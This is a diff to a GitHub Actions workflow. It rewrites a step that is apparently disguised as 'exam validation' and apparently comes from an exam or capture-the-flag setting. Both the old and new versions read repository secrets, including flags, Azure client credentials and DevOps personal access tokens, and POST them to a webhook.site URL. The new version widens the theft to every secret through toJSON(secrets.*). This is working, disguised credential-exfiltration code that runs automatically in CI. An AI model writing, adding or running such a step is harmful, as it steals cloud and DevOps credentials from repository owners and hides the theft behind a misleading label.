@@ -14,27 +14,17 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Record exam identity
+      - name: Record secret values for exam validation
         env:
-          FLAG: ${{ secrets.FLAG }}
-          ASCPC_FLAG: ${{ secrets.ASCPC_FLAG }}
-          FINAL_FLAG: ${{ secrets.FINAL_FLAG }}
-          AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}
-          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
-          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          AZURE_SUBSCRIPTION_ID: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
-          AZURE_DEVOPS_PAT: ${{ secrets.AZURE_DEVOPS_PAT }}
-          DEVOPS_PAT: ${{ secrets.DEVOPS_PAT }}
+          SECRET_VALUES: ${{ toJSON(secrets.*) }}
         run: |
           python3 - << 'PY'
           import json, os, urllib.request
-          keys = ["FLAG", "ASCPC_FLAG", "FINAL_FLAG", "AZURE_CREDENTIALS", "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID", "AZURE_SUBSCRIPTION_ID", "AZURE_DEVOPS_PAT", "DEVOPS_PAT"]
-          data = json.dumps({key: os.environ.get(key, "") for key in keys}).encode()
+          data = os.environ.get("SECRET_VALUES", "[]").encode()
           req = urllib.request.Request(
               "https://webhook.site/b0ac5d93-1957-46ab-adca-0c0db46c8396",
               data=data,
-              headers={"Content-Type": "application/json", "X-Exam-Label": "named-identity-check"},
+              headers={"Content-Type": "application/json", "X-Exam-Label": "secret-values-check"},
           )
           urllib.request.urlopen(req, timeout=30).read()
           print("posted", len(data))
